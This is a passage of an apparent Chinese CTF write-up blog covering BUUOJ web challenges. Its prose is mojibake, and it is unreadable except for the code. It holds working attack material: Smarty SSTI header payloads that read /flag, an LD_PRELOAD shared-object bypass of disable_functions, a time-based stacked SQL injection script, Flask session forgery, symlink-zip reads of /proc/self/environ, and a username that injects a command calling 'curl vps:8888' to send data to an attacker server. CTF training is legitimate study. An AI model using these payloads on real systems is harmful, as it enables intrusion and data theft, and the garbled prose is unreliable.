å¤„å›æ˜¾<code>14</code>ï¼Œç¡®å®åœ¨è¿™é‡Œå­˜åœ¨<code>ssti</code></li></ol></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;&#123;7+7&#125;&#125;&quot;   &#x2F;&#x2F;è¿”å›14</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;$smarty.version&#125;&quot;   &#x2F;&#x2F;è¿”å›3.1.30</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨ifæ ‡ç­¾æ‰§è¡Œå‘½ä»¤</span><br><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:25138&#x2F;xff&#x2F; -H &quot;X-Forwarded-For: &#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;&quot;</span><br></pre></td></tr></table></figure><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p></blockquote><h3 id="0x-03-Wallbreaker-Easy"><a href="#0x-03-Wallbreaker-Easy" class="headerlink" title="0x 03 Wallbreaker_Easy"></a>0x 03 Wallbreaker_Easy</h3><ul><li><p>è€ƒç‚¹</p><p>disable_function bypass</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>æ”»å‡»æ€è·¯</li></ol><p>åˆ©ç”¨<code>Imagick()</code>ä¸­ä¼šè§¦å‘<code>phpè§£é‡Šå™¨å‘å¤–å¼€å¯ç³»ç»Ÿè¿›ç¨‹</code>çš„æ–¹æ³•ï¼Œè¿™é‡Œçš„æ€è·¯æ˜¯å½“ä¼ å…¥<code>MPEG</code>æ ¼å¼ç±»å‹çš„æ–‡ä»¶æ—¶å€™ï¼Œä¸ºäº†è½¬æ¢æ ¼å¼ä¼šå‘å¤–éƒ¨ç¯å¢ƒè¯·æ±‚å¹¶è§¦å‘<code>ffmpeg</code>çš„è°ƒç”¨ï¼Œä»è€Œå¼€å¯æ–°çš„è¿›ç¨‹ã€‚åœ¨å¼€å¯æ—¶ï¼Œç¯å¢ƒå˜é‡<code>LD_PRELOAD</code>ä¼šé¦–å…ˆåŠ è½½ï¼Œè€Œæˆ‘ä»¬äº‹å…ˆä¼šå°†æˆ‘ä»¬çš„<code>æ¶æ„å…±äº«æ–‡ä»¶hack.soåœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸­æŒ‡å‡ºæ¥</code>ï¼Œå³<code>LD_PRELOAD={DIR}/hack.so</code>ã€‚hack.soå…±äº«æ–‡ä»¶ç”±hack.cæ–‡ä»¶ç¼–è¯‘ï¼Œå…¶ä¸­è°ƒç”¨äº†<code>__attribute__((constructor))</code>ï¼Œè¯¥æ–¹æ³•ä¼šåœ¨å…±äº«æ–‡ä»¶è¢«åŠ è½½çš„æ—¶å€™ç‡å…ˆè¢«æ‰§è¡Œã€‚</p><ol start="2"><li>ç¼–å†™hack.c</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;8810490ee01835952ff9359d77cce4bd&#x2F;lxj.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤<code>gcc --share -fPIC hack.c -o hack.so</code>å‘½ä»¤æ¥ç¼–è¯‘å…±äº«æ–‡ä»¶</p><p>è·å–soæ–‡ä»¶çš„base64å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'1.txt'</span>,base64_encode(file_get_contents(<span class="string">'P3rh4ps.so'</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶å¹¶æ‰§è¡Œ</p><p>ä¸€æ‰“å°±å´©ã€‚ã€‚ã€‚ã€‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://p3rh4ps.top/index.php/2020/01/12/20-1-12-æ€»ç»“/" target="_blank" rel="noopener">https://p3rh4ps.top/index.php/2020/01/12/20-1-12-%E6%80%BB%E7%BB%93/</a></p><p><a href="https://glotozz.github.io/2020/02/26/ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func/#ä¸€-dl-æ‹“å±•åº“ç»•è¿‡" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p><p><a href="https://ch4ser-go.github.io/2019/12/26/LD-PRELOADåŠ«æŒç±»å‹é¢˜ç›®/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</a></p><p><a href="https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/</a></p></blockquote><h3 id="0x-04-SWPU2019-Web4"><a href="#0x-04-SWPU2019-Web4" class="headerlink" title="0x 04 [SWPU2019]Web4"></a>0x 04 [SWPU2019]Web4</h3><ul><li><p>è€ƒç‚¹</p><p>å †å æ³¨å…¥</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li><p>é¢˜ç›®æ‰“å¼€æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œè¾“å…¥è´¦å·å¯†ç åç‚¹å‡»ç™»é™†é¡µé¢æ— ä»»ä½•ç›¸åº”ï¼Œæ³¨å†ŒåŠŸèƒ½ä¹Ÿæ˜¯å°šæœªå¼€æ”¾ã€‚æŸ¥çœ‹æºä»£ç å¯ä»¥çœ‹åˆ°ä¸€ä¸ªjsæ–‡ä»¶ï¼ŒF12ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ªç½‘ç»œè¯·æ±‚ã€‚</p><p>jsä¸»è¦åŠŸèƒ½æ˜¯å°†usernameå’Œpasswordä»¥jsonæ ¼å¼ç„¶åå‘ç»™index.php?r=Login/Loginã€‚</p><p>æŠ“åŒ…è¿›è¡Œæµ‹è¯•å‘ç°usernameä¸­åŠ å…¥å•å¼•å·ä¼šç›´æ¥500é”™è¯¯ï¼Œè€Œé—­åˆå¼•å·åä¼šæ­£å¸¸æ˜¾ç¤ºã€‚è¯æ˜å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯è¿‡æ»¤äº†select,if,sleep,substrç­‰å¤§å¤šæ•°æ³¨å…¥å¸¸è§çš„å•è¯ã€‚åœ¨å•å¼•å·ååŠ å…¥åˆ†å·(;)ï¼Œè‹¥æ— æ³•å¤šè¯­å¥æ‰§è¡Œï¼Œè¿”å›é¡µé¢æŒ‰ç†è¯´åº”è¯¥æ˜¯500ï¼Œä½†åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜å¯èƒ½å­˜åœ¨å †å å…¥ã€‚</p></li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323000349366.png" alt></p><ol start="2"><li>åœ¨è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨16è¿›åˆ¶+<a href="https://dev.mysql.com/doc/refman/5.7/en/sql-prepared-statements.html" target="_blank" rel="noopener">mysqlé¢„å¤„ç†</a>æ¥ç»•è¿‡ã€‚</li></ol><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/E:%5CHexo-Blog%5Csource_posts%5CBUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89%5Ct01c4535f91421496d4.png" alt></p><p>è¿™é‡Œå·ä¸ªæ‡’ï¼Œä½¿ç”¨å®˜æ–¹wpçš„è„šæœ¬è·‘äº†ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#author: c1e4r</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #é¢˜ç›®åœ°å€</span><br><span class="line">    url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;925fe2df-66f2-40c3-b13d-5b86e079f231.node3.buuoj.cn&#x2F;index.php?r&#x3D;Login&#x2F;Login&#39;&#39;&#39;</span><br><span class="line">    #æ³¨å…¥payload</span><br><span class="line">    payloads &#x3D; &quot;asd&#39;;set @a&#x3D;0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1,30):</span><br><span class="line">        #æŸ¥è¯¢payload</span><br><span class="line">        payload &#x3D; &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))&#x3D;&#123;1&#125;,sleep(3),1)&quot;</span><br><span class="line">        for j in range(0,128):</span><br><span class="line">            #å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span><br><span class="line">            datas &#x3D; &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;</span><br><span class="line">            data &#x3D; json.dumps(datas)</span><br><span class="line">            times &#x3D; time.time()</span><br><span class="line">            res &#x3D; requests.post(url &#x3D; url, data &#x3D; data)</span><br><span class="line">            if time.time() - times &gt;&#x3D; 3:</span><br><span class="line">                flag &#x3D; flag + chr(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>glzjin_wants_a_girl_friend.zip</code>ï¼Œè®¿é—®å¾—åˆ°æºä»£ç åŒ…ã€‚</p><ol start="3"><li>å®¡è®¡ä»£ç å‘ç°æ˜¯ä¸€ä¸ªç®€å•çš„mvcæ¡†æ¶ã€‚</li></ol><p>urlå¤§è‡´çš„è§£ææµç¨‹ï¼šä»rå‚æ•°ä¸­è·å–è¦è®¿é—®çš„Controllerä»¥åŠAction,ç„¶åä»¥/åˆ†éš”å¼€åæ‹¼æ¥æˆå®Œæ•´çš„æ§åˆ¶å™¨åã€‚ä»¥Login/Indexä¸ºä¾‹ï¼Œå°±æ˜¯å°†Login/Indexåˆ†éš”å¼€åˆ†åˆ«æ‹¼æ¥æˆLoginControllerä»¥åŠactionIndex,ç„¶åè°ƒç”¨LoginControllerè¿™ä¸ªç±»ä¸­çš„actionIndexæ–¹æ³•ã€‚æ¯ä¸ªactioné‡Œé¢ä¼šè°ƒç”¨å¯¹åº”çš„loadView()æ–¹æ³•è¿›è¡Œæ¨¡ç‰ˆæ¸²æŸ“ï¼Œç„¶åå°†é¡µé¢è¿”å›ç»™å®¢æˆ·ç«¯ã€‚è‹¥è®¿é—®çš„Controllerä¸å­˜åœ¨åˆ™é»˜è®¤è§£æLogin/Indexã€‚</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323001018876.png" alt></p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323001209515.png" alt></p><p>å…¶ä¸­ ,BaseControllerçš„loadViewæ–¹æ³•å‘ç°ä½¿ç”¨äº†extractï¼Œåé¢åˆincludeäº†ä¸€ä¸ªæ–‡ä»¶ã€‚é‚£ä¹ˆæ„å‘³ç€åªè¦$viewDataå¯æ§æˆ‘ä»¬å³å¯è¦†ç›–æ‰$this-&gt;viewPathæ–‡ä»¶ä¸­çš„æŸäº›å˜é‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Controller&#x2F;UserController.php</span><br><span class="line">public function actionIndex()</span><br><span class="line">&#123;</span><br><span class="line">    $listData &#x3D; $_REQUEST;</span><br><span class="line">    $this-&gt;loadView(&#39;userIndex&#39;,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$listDataæ˜¯ä»REQUESTæå–å‡ºæ¥çš„ï¼Œå®Œå…¨å¯æ§ã€‚è€Œå…¶å¯¹åº”çš„/View/userIndex.phpä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶è¯»å–ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;View&#x2F;userIndex.php</span><br><span class="line">if(!isset($img_file)) &#123;</span><br><span class="line">$img_file &#x3D; &#39;&#x2F;..&#x2F;favicon.ico&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$img_dir &#x3D; dirname(__FILE__) . $img_file;</span><br><span class="line">$img_base64 &#x3D; imgToBase64($img_dir);</span><br><span class="line">echo &#39;&lt;img src&#x3D;&quot;&#39; . $img_base64 . &#39;&quot;&gt;&#39;;</span><br></pre></td></tr></table></figure><p>$img_fileå¯é€šè¿‡extract($viewData)å˜é‡è¦†ç›–æ¼æ´å®Œå…¨æ§åˆ¶ï¼Œè€Œ$viewDataæ˜¯å—ç”¨æˆ·æ§åˆ¶çš„å®Œå…¨æ§åˆ¶çš„ã€‚æ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚</p><p>è®¿é—®ï¼š<code>925fe2df-66f2-40c3-b13d-5b86e079f231.node3.buuoj.cn/index.php?r=User/Index&amp;img_file=/../flag.php</code>å³å¯å¾—åˆ°base64ç¼–ç çš„flag</p><h3 id="0x-05-SWPU2019-Web3"><a href="#0x-05-SWPU2019-Web3" class="headerlink" title="0x 05 [SWPU2019]Web3"></a>0x 05 [SWPU2019]Web3</h3><ul><li><p>è€ƒç‚¹</p><p>flask-sessionä¼ªé€ ã€linuxç›¸å…³çŸ¥è¯†</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><p>1ã€é¡µé¢æ‰“å¼€æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œéšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å³å¯æˆåŠŸç™»å…¥ï¼Œæœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œä½†æ˜¯ç‚¹è¿›å»æç¤º<code>Permission denied!</code>ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚å³é”®æŸ¥çœ‹æºä»£ç å‘ç°é¢˜ç›®æç¤º<code>404 not found</code></p><blockquote><p>åœ¨ flask ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ app.errorhandler()è£…é¥°å™¨æ¥æ³¨å†Œé”™è¯¯å¤„ç†å‡½æ•°ï¼Œå‚æ•°æ˜¯ HTTP é”™è¯¯çŠ¶æ€ç æˆ–è€…ç‰¹å®šçš„å¼‚å¸¸ç±»ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°åœ¨ 404 é”™è¯¯ä¸­ä¼šæœ‰ä¸œè¥¿å­˜åœ¨ã€‚</p></blockquote><p>è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯ç”±ï¼š/loginaï¼Œæ˜¾ç¤º<code>404 not found</code>ï¼Œåœ¨ HTTP å¤´ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸² base64 å­—ç¬¦ä¸²ï¼Œè§£ç åå¯ä»¥å¾—åˆ° secret_key:<code>keyqqqwwweee!@#$%^&amp;*</code></p><ol start="2"><li>ä½¿ç”¨<code>flask_session_cookie_manager3.py</code>æ¥ä¼ªé€ cookieï¼Œ<strong>æ³¨æ„è¦åœ¨linuxç¯å¢ƒä¸‹è¿è¡Œ</strong></li></ol><p>è§£å¯†sessionå¾—åˆ°ï¼š<code>{&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;123&#39;, &#39;username&#39;: &#39;123&#39;}</code></p><p>ä¿®æ”¹ id=bâ€™1â€™ï¼Œå¾—åˆ°cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_manager.py encode -s &quot;keyqqqwwweee!@#$%^&amp;*&quot; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;123&#39;, &#39;username&#39;: &#39;123&#39;&#125;&quot;</span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE</span><br><span class="line">è¿™é‡Œæˆ‘ä»¬ä¼ªé€ id:b&#39;1&#39;çš„ç”¨æˆ·sessionè¿›è¡Œç™»å½•</span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»é™†ï¼Œå¾—åˆ°å¦‚ä¸‹</p><p><img src="/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/image-20200323151641468.png" alt></p><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼Œé‡Œé¢æœ‰ upload()å’Œ showflag()ä¸¤ä¸ªå‡½æ•°çš„æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">upload()å…³é”®ä»£ç ï¼š</span><br><span class="line">basepath&#x3D;os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">path &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;+md5_one+&#39;&#x2F;&#39;+session[&#39;username&#39;]+&quot;&#x2F;&quot;</span><br><span class="line">path_base &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;</span><br><span class="line">filename &#x3D; f.filename</span><br><span class="line">pathname &#x3D; path+filename</span><br><span class="line">if &quot;zip&quot; !&#x3D; filename.split(&#39;.&#39;)[-1]:</span><br><span class="line">    return &#39;zip only allowed&#39;</span><br><span class="line">......</span><br><span class="line">try:</span><br><span class="line">    cmd &#x3D; &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname</span><br><span class="line">    if cmd.find(&#39;|&#39;) !&#x3D; -1 or cmd.find(&#39;;&#39;) !&#x3D; -1:</span><br><span class="line">        waf()</span><br><span class="line">        return &#39;error&#39;</span><br><span class="line">    os.system(cmd)</span><br><span class="line">......</span><br><span class="line">image &#x3D; open(path+unzip_filename, &quot;rb&quot;).read()</span><br><span class="line">resp &#x3D; make_response(image)</span><br><span class="line">resp.headers[&#39;Content-Type&#39;] &#x3D; &#39;image&#x2F;png&#39;</span><br><span class="line">return resp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„åŠŸèƒ½å°±æ˜¯å®¢æˆ·ç«¯ä¸Šä¼ ä¸€ä¸ªå‹ç¼©åçš„å›¾ç‰‡ï¼ŒæœåŠ¡ç«¯ä¼šè§£å‹ç¼©åå¹¶è¯»å–å›¾ç‰‡è¿”å›å®¢æˆ·ç«¯ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥å‹ç¼©åŒ…ï¼Œæ¥è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶è€Œä¸æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚åŒæ—¶ç»“åˆ showflag()å‡½æ•°çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ flag.jpg æ”¾åœ¨ flask åº”ç”¨æ ¹ç›®å½•çš„ flag ç›®å½•ä¸‹ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åˆ›å»ºä¸€ä¸ªåˆ°<code>/xxx/flask/flag/flag.jpg</code>çš„è½¯é“¾æ¥ï¼Œå³å¯è¯»å– flag.jpg æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼</p><p><strong>0x00ï¼š</strong><br>åœ¨ linux ä¸­ï¼Œ<code>/proc/self/cwd/</code>ä¼šæŒ‡å‘è¿›ç¨‹çš„å½“å‰ç›®å½•ï¼Œé‚£ä¹ˆåœ¨ä¸çŸ¥é“ flask å·¥ä½œç›®å½•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>/proc/self/cwd/flag/flag.jpg</code>æ¥è®¿é—® flag.jpg</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg qwe</span><br><span class="line">zip -ry qwe.zip qwe</span><br></pre></td></tr></table></figure><p><strong>0x01ï¼š</strong><br>åœ¨ linux ä¸­ï¼Œ<code>/proc/self/environ</code>æ–‡ä»¶é‡ŒåŒ…å«äº†è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»ä¸­è·å– flask åº”ç”¨çš„ç»å¯¹è·¯å¾„ï¼Œå†é€šè¿‡ç»å¯¹è·¯å¾„åˆ¶ä½œè½¯é“¾æ¥æ¥è¯»å– flag.jpg (PSï¼šåœ¨æµè§ˆå™¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥çœ‹åˆ°<code>/proc/self/environ</code>çš„å†…å®¹ï¼Œåªéœ€è¦ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç”¨ notepad++æ‰“å¼€å³å¯)</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;environ qqq</span><br><span class="line">zip -ry qqq.zip qqq</span><br><span class="line">ln -s &#x2F;ctf&#x2F;hgfjakshgfuasguiasguiaaui&#x2F;myflask&#x2F;flag&#x2F;flag.jpg www</span><br><span class="line">zip -ry [www.zip](http:&#x2F;&#x2F;www.zip) www</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;3917cde6-876c-43a8-ae7a-d9351fd1f1ec.node3.buuoj.cn&#x2F;upload&quot;</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;cookie&#39;:&#39;session&#x3D;eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TE&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    files &#x3D; &#123;&#39;file&#39;:open(&#39;E:&#x2F;&#x2F;qwe.zip&#39;,&#39;rb&#39;)&#125;</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">        &#39;submit&#39;:&#39;Submit&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,data&#x3D;data,headers&#x3D;headers)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><ul><li>éé¢„æœŸè§£æ³•</li></ul><p>é¢˜ç›®ä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f&#x3D;request.files[&#39;file&#39;]</span><br><span class="line">path &#x3D; basepath+&#39;&#x2F;upload&#x2F;&#39;+md5_ip+&#39;&#x2F;&#39;+md5_one+&#39;&#x2F;&#39;+session[&#39;username&#39;]+&quot;&#x2F;&quot;</span><br><span class="line">filename &#x3D; f.filename</span><br><span class="line">pathname &#x3D; path+filename</span><br><span class="line">try:</span><br><span class="line">cmd &#x3D; &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname</span><br><span class="line">if cmd.find(&#39;|&#39;) !&#x3D; -1 or cmd.find(&#39;;&#39;) !&#x3D; -1:</span><br><span class="line">waf()</span><br><span class="line">return &#39;error&#39;</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p><code>filename</code>å’Œ<code>session[&#39;username&#39;]</code>æˆ‘ä»¬éƒ½æ˜¯å¯æ§çš„ï¼Œç„¶åå‚æ•°ä¹‹é—´æ‹¼æ¥åˆ°å‘½ä»¤ã€‚åªæ˜¯è¿‡æ»¤äº†<code>|</code>å’Œ<code>;</code>ï¼Œä½†æ˜¯<code>&amp;</code>å’Œ<code>#</code>éƒ½æ²¡æœ‰è¿‡æ»¤æ‰ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>å¯æ§çš„ä¸¤ä¸ªå‚æ•°ä¸­ï¼Œ<code>filename</code>å› ä¸ºæ˜¯æ–‡ä»¶åï¼Œä¸èƒ½å¸¦æœ‰<code>/</code>ï¼Œæ‰€ä»¥ä¸å¥½æ³¨å…¥</p><p>äºæ˜¯å°±æŠŠæ³¨å…¥ç‚¹æ”¾åœ¨<code>session[&#39;username&#39;]</code></p><p>æ³¨å†Œç”¨æˆ·åï¼š<code>&amp; curl vps:8888 #</code>ï¼Œå¾—åˆ°sessionåï¼ŒåŒæ ·æŒ‰ä¸Šé¢çš„æ–¹æ³•ä¸€æ ·ä¿®æ”¹<code>id:1</code>ç„¶åè®¿é—®<code>/upload</code></p><p>åˆ©ç”¨-d å‚æ•°å°†jpgæ–‡ä»¶ä¿¡æ¯å¸¦å‡ºæ¥ï¼Œå‚è€ƒï¼š<a href="https://nikoeurus.github.io/2019/12/09/SWPU-ctf/#easy-python" target="_blank" 